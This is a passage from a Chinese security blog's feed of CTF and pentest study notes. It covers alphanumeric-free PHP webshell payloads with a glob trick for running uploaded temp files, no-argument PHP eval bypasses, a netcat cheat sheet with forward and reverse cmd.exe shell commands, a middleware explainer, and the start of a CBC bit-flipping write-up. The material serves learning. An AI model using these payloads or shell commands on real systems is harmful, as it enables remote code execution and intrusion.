title="XYTK"><p>PHP7前是不允许用($a)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。所以，我们可以通过(‘phpinfo’)();来执行函数，第一个括号中可以是任意PHP表达式。</p><p>所以很简单了，构造一个可以生成phpinfo这个字符串的PHP表达式即可。payload如下（不可见字符用url编码表示）：</p><blockquote><p>(~%8F%97%8F%96%91%99%90)();</p></blockquote><img src="/2019/10/26/无字母数字的webshell/8.png" title="XYTK"><h2 id="PHP5的思考"><a href="#PHP5的思考" class="headerlink" title="PHP5的思考"></a>PHP5的思考</h2><p>我们使用docker run –rm -p 9090:80 -v <code>pwd</code>:/var/www/html php:5.6-apach来运行一个php5.6的web环境。</p><p>此时，我们尝试用PHP7的payload，将会得到一个错误：</p><img src="/2019/10/26/无字母数字的webshell/9.png" title="XYTK"><p>原因就是php5并不支持这种表达方式。</p><p>在我在知识星球里发出帖子的时候，其实还没想到如何用PHP5解决问题，但我有自信解决它，所以先发了这个小挑战。后来关上电脑仔细想想，发现当思路禁锢在一个点的时候，你将会钻进牛角尖；当你用大局观来看待问题，问题就迎刃而解。</p><p>当然，我觉得我的方法应该不是唯一的，不过一直没人出来公布答案，我就先抛钻引玉了。</p><p>大部分语言都不会是单纯的逻辑语言，一门全功能的语言必然需要和操作系统进行交互。操作系统里包含的最重要的两个功能就是“shell（系统命令）”和“文件系统”，很多木马与远控其实也只实现了这两个功能。</p><p>PHP自然也能够和操作系统进行交互，“反引号”就是PHP中最简单的执行shell的方法。那么，在使用PHP无法解决问题的情况下，为何不考虑用“反引号”+“shell”的方式来getshell呢？</p><h2 id="PHP5-shell打破禁锢"><a href="#PHP5-shell打破禁锢" class="headerlink" title="PHP5+shell打破禁锢"></a>PHP5+shell打破禁锢</h2><p>因为反引号不属于“字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、$的系统命令来getshell？</p><p>好像问题又回到了原点：无字母、数字、$，在shell中仍然是一个难题。</p><p>此时我想到了两个有趣的Linux shell知识点：</p><p>1.shell下可以利用.来执行任意脚本</p><p>2.Linux文件名支持用glob通配符代替</p><p>第一点曾在《 小密圈里的那些奇技淫巧 》露出过一角，但我没细讲。.或者叫period，它的作用和source一样，就是用当前的shell执行一个文件中的命令。比如，当前运行的shell是bash，则. file的意思就是用bash执行file文件中的命令。</p><p>用. file执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用.来执行它了吗？</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是/tmp/phpXXXXXX，文件名最后6个字符是随机的大小写字母。</p><p>第二个难题接踵而至，执行. /tmp/phpXXXXXX，也是有字母的。此时就可以用到Linux下的glob通配符：</p><p>*可以代替0个及以上任意字符</p><p>?可以代表1个任意字符</p><p>那么，/tmp/phpXXXXXX就可以表示为/*/?????????或/???/?????????。</p><p>但我们尝试执行. /???/?????????，却得到如下错误：</p><img src="/2019/10/26/无字母数字的webshell/10.png" title="XYTK"><p>这是因为，能够匹配上/???/?????????这个通配符的文件有很多，我们可以列出来：</p><img src="/2019/10/26/无字母数字的webshell/11.png" title="XYTK"><p>可见，我们要执行的/tmp/phpcjggLC排在倒数第二位。然而，在执行第一个匹配上的文件（即/bin/run-parts）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p><p>思路又陷入了僵局，虽然方向没错。</p><h2 id="深入理解glob通配符"><a href="#深入理解glob通配符" class="headerlink" title="深入理解glob通配符"></a>深入理解glob通配符</h2><p>大部分同学对于通配符，可能知道的都只有*和?。但实际上，阅读Linux的文档（ <a href="http://man7.org/linux/man-pages/man7/glob.7.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man7/glob.7.html</a> ），可以学到更多有趣的知识点。</p><p>其中，glob支持用[^x]的方法来构造“这个位置不是字符x”。那么，我们用这个姿势干掉/bin/run-parts：</p><img src="/2019/10/26/无字母数字的webshell/12.png" title="XYTK"><p>排除了第4个字符是-的文件，同样我们可以排除包含.的文件：</p><img src="/2019/10/26/无字母数字的webshell/13.png" title="XYTK"><p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p><p>继续阅读glob的帮助，我发现另一个有趣的用法：</p><img src="/2019/10/26/无字母数字的webshell/14.png" title="XYTK"><p>就跟正则表达式类似，glob支持利用[0-9]来表示一个范围。</p><p>我们再来看看之前列出可能干扰我们的文件：</p><img src="/2019/10/26/无字母数字的webshell/15.png" title="XYTK"><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于@与[之间：</p><img src="/2019/10/26/无字母数字的webshell/16.jpg" title="XYTK"><p>那么，我们可以利用[@-[]来表示大写字母：</p><img src="/2019/10/26/无字母数字的webshell/17.png" title="XYTK"><h2 id="构造POC，执行任意命令"><a href="#构造POC，执行任意命令" class="headerlink" title="构造POC，执行任意命令"></a>构造POC，执行任意命令</h2><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为?&gt;<?=. /???/????????[@-[];?>，发送数据包如下：</p><img src="/2019/10/26/无字母数字的webshell/18.png" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;p神原文。&lt;/p&gt;
&lt;p&gt;链接： &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATI
      
    
    </summary>
    
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="webshell" scheme="https://xytk0x0.github.io/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>【转载】web服务器、web中间件和web容器的区别</title>
    <link href="https://xytk0x0.github.io/2019/10/26/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%91web%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81web%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%92%8Cweb%E5%AE%B9%E5%99%A8%E7%9A%84%E5%8C%BA%E5%88%AB/"/>
    <id>https://xytk0x0.github.io/2019/10/26/【转载】web服务器、web中间件和web容器的区别/</id>
    <published>2019-10-26T01:07:15.000Z</published>
    <updated>2019-10-26T03:35:51.621Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>看web方向的东西也挺长时间了，这些概念还是区分不清，正好看见一篇博客具体介绍了这些概念。</p><p>原文链接： </p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84501439" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84501439</a></p><p><a href="https://blog.csdn.net/qq_36119192/article/details/84261392" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84261392</a></p><hr><h1 id="web服务器"><a href="#web服务器" class="headerlink" title="web服务器"></a>web服务器</h1><p><strong>广义的web服务器（Web Server）：</strong>提供web服务的软件或主机，即Web服务器软件或装有Web服务器软件的计算机。例如：IIS、apache、nginx等。Web服务器可以处理 HTTP 协议，响应针对静态页面或图片的请求，进行页面跳转，或者把动态请求委托其它程序（它的扩展、某种语言的解释引擎(php)、Web容器）。</p><p>所以，我们可以把 IIS、Apache、Nginx、Tomcat等都称为Web服务器，因为他们都提供了web服务。</p><hr><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><p><strong>中间件（Middleware）</strong>是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。中间件处在操作系统和更高一级应用程序之间。他充当的功能是：将应用程序运行环境与操作系统隔离，从而实现应用程序开发者不必为更多系统问题忧虑，而直接关注该应用程序在解决问题上的能力 。容器就是中间件的一种。</p><p>而<strong>Web中间件</strong>就是提供web应用软件和系统软件连接的软件的一个总称。</p><h2 id="Java-web中间件"><a href="#Java-web中间件" class="headerlink" title="Java web中间件"></a>Java web中间件</h2><img src="/2019/10/26/【转载】web服务器、web中间件和web容器的区别/0.png" title="XYTK"><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat 是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Java Web 应用服务器(Servlet 容器)。实际上Tomcat 部分是Apache 服务器的扩展，但它是独立运行的，所以当你运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。Tomcat默认使用 8080 号端口</p><h3 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h3><p>WebLogic 是美国Oracle公司出品的一个application server，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。Weblogic默认端口是 7001。</p><h3 id="Jboss"><a href="#Jboss" class="headerlink" title="Jboss"></a>Jboss</h3><p>Jboss 是一个基于Java EE的开放源代码的应用服务器。 它不但是Servlet容器，而且也是EJB容器，从而受到企业级开发人员的欢迎，从而弥补了Tomcat只是一个Servlet容器的缺憾。JBoss是一个管理EJB的容器和服务器。但JBoss核心服务不包括支持 servlet/JSP 的WEB容器，一般与 Tomcat 或 Jetty 绑定使用。Jboss默认端口号是8080。</p><h3 id="Jetty"><a href="#Jetty" class="headerlink" title="Jetty"></a>Jetty</h3><p>Jetty 是一个开源的servlet容器，它为基于Java的web容器，例如JSP和servlet提供运行环境。Jetty是使用JAVA编写的，它的API以一组JAR包的形式发布。开发人员可以将Jetty容器实例化成一个对象，可以迅速为一些独立运行（stand-alone）的Java应用提供网络和web连接。</p><h3 id="Webshere"><a href="#Webshere" class="headerlink" title="Webshere"></a>Webshere</h3><p>WebShere 是 IBM 的软件平台。它包含了编写、运行和监视全天候的工业强度的随需应变 Web 应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 提供了可靠、灵活和健壮的软件。WebSphere 是一个模块化的平台，基于业界支持的开放标准。可以通过受信任和持久的接口，将现有资产插入 WebSphere，可以继续扩展环境。WebSphere 可以在许多平台上运行，包括 Intel、Linux 和 z/OS。Webshere默认端口号是 9080。</p><h3 id="Glasshfish"><a href="#Glasshfish" class="headerlink" title="Glasshfish"></a>Glasshfish</h3><p>GlassFish 是一款强健的商业兼容应用服务器，达到产品级质量，可免费用于开发、部署和重新分发。开发者可以免费获得源代码，还可以对代码进行更改</p><hr><h1 id="容器"><a href="#容器" class="headerlink" title="容器"></a>容器</h1><p><strong>容器：</strong>容器是中间件的一种，作为操作系统和应用程序之间的桥梁，给处于其中的应用程序组件提供一个环境，使应用程序直接跟容器中的环境变量交互，而不必关注其它系统问题。例如：tomcat（servlet容器），Jboss(EJB容器)。这些容器提供的接口严格遵守J2EE规范中的web application 标准。</p><p><strong>web容器：</strong>我们把遵守J2EE规范标准的web服务器就叫做J2EE中的web容器。处理 web服务的容器，例如tomcat（servlet容器），IIS(asp容器)。web容器用于给处于其中的应用程序组件（ASP、JSP）提供一个环境，是中间件的一个组成部分，它实现了对动态语言的解析。比如tomcat可以解析jsp，是因为其内部有一个servlet容器。</p><p><strong>EJB容器(Enterprise java bean )：</strong>更具有行业领域特色。他提供给运行在其中的组件EJB各种管理功能。只要满足J2EE规范的EJB放入该容器，马上就会被容器进行高效率的管理。并且可以通过现成的接口来获得系统级别的服务。例如邮件服务、事务管理。</p><p>WEB容器和EJB容器在原理上是大体相同的，更多的区别是被隔离的外界环境。WEB容器更多的是跟基于HTTP的请求打交道。而 EJB容器不是。它是更多的跟数据库、其它服务打交道。但他们都是把与外界的交互实现从而减轻应用程序的负担。例如servlet不用关心http的细 节，直接引用环境变量session,request,response就行、EJB不用关心数据库连接速度、各种事务控制，直接由容器来完成。</p><p>所以说，我们也可以把 IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)等叫做Web容器</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>其实，对于这些名词，也并没有一个十分清楚的概念说这个就是属于这个，而不能属于那个。他们之间很多是包含关系。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web服务器：IIS、Apache、Nginx、Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish、Lighttpd等</span><br><span class="line">web中间件：Tomcat、Jboss、Jetty、Weblogic、Webshere、Glasshfish等</span><br><span class="line">web容器：IIS(asp容器)、Tomcat(servlet容器)、Jboss(EJB容器)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;看web方向的东西也挺长时间了，这些概念还是区分不清，正好看见一篇博客具体介绍了这些概念。&lt;/p&gt;
&lt;p&gt;原文链接： &lt;/p&gt;
&lt;p&gt;&lt;a 
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="Java web" scheme="https://xytk0x0.github.io/tags/Java-web/"/>
    
  </entry>
  
  <entry>
    <title>blog的意义</title>
    <link href="https://xytk0x0.github.io/2019/10/20/blog%E7%9A%84%E6%84%8F%E4%B9%89/"/>
    <id>https://xytk0x0.github.io/2019/10/20/blog的意义/</id>
    <published>2019-10-20T06:56:20.000Z</published>
    <updated>2019-12-06T10:12:57.163Z</updated>
    
    <content type="html"><![CDATA[<p><strong>写博客确实让我更多的思考和实践，毕竟写出来不仅仅是给自己看的。</strong></p><p><strong>比如说有一种新的利用姿势，我理解的是十分，写出来的可能只有七分，你看过之后可能就只剩下三分了。多动动手总归是好的。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;写博客确实让我更多的思考和实践，毕竟写出来不仅仅是给自己看的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;比如说有一种新的利用姿势，我理解的是十分，写出来的可能只有七分，你看过之后可能就只剩下三分了。多动动手总归是好的。&lt;/strong&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="日常生活的乱七八糟" scheme="https://xytk0x0.github.io/categories/%E6%97%A5%E5%B8%B8%E7%94%9F%E6%B4%BB%E7%9A%84%E4%B9%B1%E4%B8%83%E5%85%AB%E7%B3%9F/"/>
    
    
      <category term="Blog里的胡言乱语" scheme="https://xytk0x0.github.io/tags/Blog%E9%87%8C%E7%9A%84%E8%83%A1%E8%A8%80%E4%B9%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>PHP无参数实现RCE</title>
    <link href="https://xytk0x0.github.io/2019/10/20/PHP%E6%97%A0%E5%8F%82%E6%95%B0%E5%AE%9E%E7%8E%B0RCE/"/>
    <id>https://xytk0x0.github.io/2019/10/20/PHP无参数实现RCE/</id>
    <published>2019-10-20T05:27:39.000Z</published>
    <updated>2019-10-20T23:35:53.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一叶飘零师傅的博客： <a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(&apos;;&apos; === preg_replace(&apos;/[^\W]+\((?R)?\)/&apos;, &apos;&apos;, $_GET[&apos;code&apos;])) &#123;    </span><br><span class="line">    eval($_GET[&apos;code&apos;]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，[^\W]包含所有的数字，字母以及下划线，而(?R)则是 DEELX 正则表达式扩展语法中的递归表达式，表示递归引用整个模式。</p><p>正则只允许无参数函数通过校验。形式如下：</p><blockquote><p>a(b(c()));</p></blockquote><p>本文要bypass实现RCE</p><p>特征：<br>1、能够进行伪造(全局变量、$_FILES、$_COOKIE)<br>2、能够使用无参数函数读取<br>3、有执行权限</p><hr><h1 id="getenv"><a href="#getenv" class="headerlink" title="getenv()"></a>getenv()</h1><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><p>PHP有很多的超全局变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br><span class="line">$_REQUEST</span><br><span class="line">$_ENV</span><br></pre></td></tr></table></figure><p>使用getenv()得到$_ENV的值</p><img src="/2019/10/20/PHP无参数实现RCE/1.png" title="XYTK"><h2 id="取数组中的值"><a href="#取数组中的值" class="headerlink" title="取数组中的值"></a>取数组中的值</h2><p>结合array_flip()和array_rand()能够取出数组中的任意值。</p><p>array_rand():使用伪随机数算法得到任意键</p><img src="/2019/10/20/PHP无参数实现RCE/2.png" title="XYTK"><p>效果如下：</p><img src="/2019/10/20/PHP无参数实现RCE/4.png" title="XYTK"><p>array_flip():交换键和值</p><img src="/2019/10/20/PHP无参数实现RCE/3.png" title="XYTK"><p>效果如下：</p><img src="/2019/10/20/PHP无参数实现RCE/5.png" title="XYTK"><blockquote><p>可能的payload:<br>eval(array_flip(array_rand(getenv())))</p></blockquote><h1 id="getallheaders"><a href="#getallheaders" class="headerlink" title="getallheaders()"></a>getallheaders()</h1><p>在apache2环境下，有函数getallheaders()可返回http header信息。</p><p>返回值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">array(8) &#123; </span><br><span class="line">    [&quot;Host&quot;]=&gt; string(14) &quot;106.14.114.127&quot; </span><br><span class="line">    [&quot;Connection&quot;]=&gt; string(10) &quot;keep-alive&quot; </span><br><span class="line">    [&quot;Cache-Control&quot;]=&gt; string(9) &quot;max-age=0&quot; </span><br><span class="line">    [&quot;Upgrade-Insecure-Requests&quot;]=&gt; string(1) &quot;1&quot; </span><br><span class="line">    [&quot;User-Agent&quot;]=&gt; string(120) &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36&quot; </span><br><span class="line">    [&quot;Accept&quot;]=&gt; string(118) &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span><br><span class="line">     [&quot;Accept-Encoding&quot;]=&gt; string(13) &quot;gzip, deflate&quot; [&quot;Accept-Language&quot;]=&gt; string(14) &quot;zh-CN,zh;q=0.9&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>可以改变http header的值，并当做PHP代码执行。</strong></p><img src="/2019/10/20/PHP无参数实现RCE/6.png" title="XYTK"><p>得到恶意的命令：</p><blockquote><p>var_dump(end(getallheaders()))</p></blockquote><img src="/2019/10/20/PHP无参数实现RCE/7.png" title="XYTK"><p>执行恶意命令：</p><img src="/2019/10/20/PHP无参数实现RCE/8.png" title="XYTK"><p>同样地，可以执行其他命令。</p><h1 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars()"></a>get_defined_vars()</h1><p>get_defined_vars()不以中间件是apache为条件，适用范围更广。</p><p>可以回显全局变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$_GET</span><br><span class="line">$_POST</span><br><span class="line">$_FILES</span><br><span class="line">$_COOKIE</span><br></pre></td></tr></table></figure><img src="/2019/10/20/PHP无参数实现RCE/9.png" title="XYTK"><p>使用$_GET方式利用流程如下：</p><img src="/2019/10/20/PHP无参数实现RCE/10.png" title="XYTK"><img src="/2019/10/20/PHP无参数实现RCE/11.png" title="XYTK"><p>通常来说，$_FILES更容易利用，不会被过滤。</p><h1 id="session-id"><a href="#session-id" class="headerlink" title="session_id()"></a>session_id()</h1><img src="/2019/10/20/PHP无参数实现RCE/12.png" title="XYTK"><p>通过脚本插入恶意参数(hex编码)更改会话ID ==&gt; eval(hex2bin(session_id(session_start())))</p><h1 id="文件及目录操作-dirname-amp-chdir"><a href="#文件及目录操作-dirname-amp-chdir" class="headerlink" title="文件及目录操作 dirname()&amp;chdir()"></a>文件及目录操作 dirname()&amp;chdir()</h1><p>getcwd():获取当前目录</p><p>scandir():扫描目录</p><p>dirname():跳到上一级目录</p><p>chdir():更改当前目录</p><p>结合var_dump()能够显示出扫描内容：</p><img src="/2019/10/20/PHP无参数实现RCE/13.png" title="XYTK">]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;一叶飘零师傅的博客： &lt;a href=&quot;https://skysec.top/2019/03/29/PHP-Parametric-Funct
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
      <category term="PHP" scheme="https://xytk0x0.github.io/categories/PHP/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://xytk0x0.github.io/tags/PHP/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>工具-netcat</title>
    <link href="https://xytk0x0.github.io/2019/10/19/%E5%B7%A5%E5%85%B7-netcat/"/>
    <id>https://xytk0x0.github.io/2019/10/19/工具-netcat/</id>
    <published>2019-10-19T07:42:47.000Z</published>
    <updated>2019-10-26T01:12:29.186Z</updated>
    
    <content type="html"><![CDATA[<h1 id="工具系列"><a href="#工具系列" class="headerlink" title="工具系列"></a>工具系列</h1><p>完整的渗透测试过程中，工具能够提供很多帮助，但一段时间不用之后就会忘记，用的时候又需要重新查，很麻烦。于是，就有了这个系列。</p><hr><h1 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h1><p>Netcat 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。</p><h1 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h1><blockquote><p>-l： 开启监听<br>-p：指定端口<br>-t： 以telnet形式应答<br>-e：程序重定向<br>-n：以数字形式表示ip<br>-v：显示执行命令过程<br>-z :  不进行交互，直接显示结果<br>-u ：使用UDP协议传输<br>-w :  设置超时时间</p></blockquote><h1 id="用法实例"><a href="#用法实例" class="headerlink" title="用法实例"></a>用法实例</h1><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>如果是想单纯的端口扫描的话，利用其它工具比如 nmap会更好。nc端口扫描最主要的用途是，当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而，我们的nmap工具是不能扫描到内网的，所以这时我们可以把nc上传到web服务器上，利用它来扫描内网主机。而由于nc体积很小，所以不容易被发现。</p><blockquote><p>nc  -z -v -n 192.168.10.14  20-23   #端口或端口范围</p></blockquote><p>如果探测到端口开放了，比如上面的 80 端口开放了，我们就可以继续探测其banner信息： </p><blockquote><p>nc -v -n 192.168.10.14  80<br>然后输入get</p></blockquote><h2 id="实现简易聊天"><a href="#实现简易聊天" class="headerlink" title="实现简易聊天"></a>实现简易聊天</h2><p>一端监听，一端发送。简易的C/S架构。</p><blockquote><p>服务器端：<br>nc   -lvp    8888      #监听8888端口  -l 监听 -v 显示详细信息  -p 指定端口</p></blockquote><blockquote><p>客户端：<br>nc  -nv  10.96.10.208  8888    #连接到服务器的8888端口  -n以数字形式显示ip  -v显示详细信息</p></blockquote><h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><blockquote><p>服务器端：<br>nc  -lvp  8888 &lt; test.txt</p></blockquote><blockquote><p>客户端：<br>nc -nv 10.96.10.208 8888 &gt;test.txt</p></blockquote><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>意思就是我们主动连接肉鸡</p><p>假如我们现在入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd命令弹到8888端口上</p><p>肉鸡</p><blockquote><p>nc -lv -p 8888 -t -e cmd.exe</p></blockquote><p>我们的主机</p><blockquote><p>nc  -nv  192.168.10.14  8888            #我们的主机访问该肉鸡的8888端口</p></blockquote><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>意思就是我们监听端口，然后肉鸡主动连接到我们的主机</p><p>我们的主机</p><blockquote><p>nc  -lvp  8888</p></blockquote><p>肉鸡</p><blockquote><p>nc  -t -e cmd.exe 10.96.10.208 8888</p></blockquote><h2 id="蜜罐"><a href="#蜜罐" class="headerlink" title="蜜罐(?)"></a>蜜罐(?)</h2><p>一直监听8888端口，知道 ctrl+C 停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">​​​​​​​&gt; nc  -L -p  8888  &gt; log.txt   #监听8888端口，并且将日志信息写入log.txt中</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;工具系列&quot;&gt;&lt;a href=&quot;#工具系列&quot; class=&quot;headerlink&quot; title=&quot;工具系列&quot;&gt;&lt;/a&gt;工具系列&lt;/h1&gt;&lt;p&gt;完整的渗透测试过程中，工具能够提供很多帮助，但一段时间不用之后就会忘记，用的时候又需要重新查，很麻烦。于是，就有了这个系列。
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://xytk0x0.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="tools" scheme="https://xytk0x0.github.io/categories/tools/"/>
    
    
      <category term="tools" scheme="https://xytk0x0.github.io/tags/tools/"/>
    
  </entry>
  
  <entry>
    <title>【wp】bugku-login4&amp;CBC字节翻转攻击</title>
    <link href="https://xytk0x0.github.io/2019/10/19/%E3%80%90wp%E3%80%91bugku-login4-CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/"/>
    <id>https://xytk0x0.github.io/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/</id>
    <published>2019-10-19T03:42:09.000Z</published>
    <updated>2019-11-15T03:40:38.948Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>题目中遇到了CBC字节翻转攻击，借此机会系统的学习一下。</p><p>CBC字节翻转攻击的精髓在于损坏密文来改变明文。</p><h2 id="资料链接："><a href="#资料链接：" class="headerlink" title="资料链接："></a>资料链接：</h2><p><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">https://blog.csdn.net/csu_vc/article/details/79619309</a></p><p><a href="https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="noopener">https://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a></p><hr><h1 id="CBC字节翻转攻击原理"><a href="#CBC字节翻转攻击原理" class="headerlink" title="CBC字节翻转攻击原理"></a>CBC字节翻转攻击原理</h1><h2 id="加密原理图："><a href="#加密原理图：" class="headerlink" title="加密原理图："></a>加密原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_0.png" title="XYTK"><p>1、Plaintext：待加密的数据。</p><p>2、IV：用于随机化加密的比特块，保证即使对相同明文多次加密，也可以得到不同的密文。</p><p>3、Ciphertext：加密后的数据</p><p>PS:</p><p>1、CBC工作于一个固定长度的比特组，被称为块。</p><p>2、CBC的填充规则是缺少N位，就是用N个’\xN’填充。</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_1.jpg" title="XYTK"><h2 id="解密原理图："><a 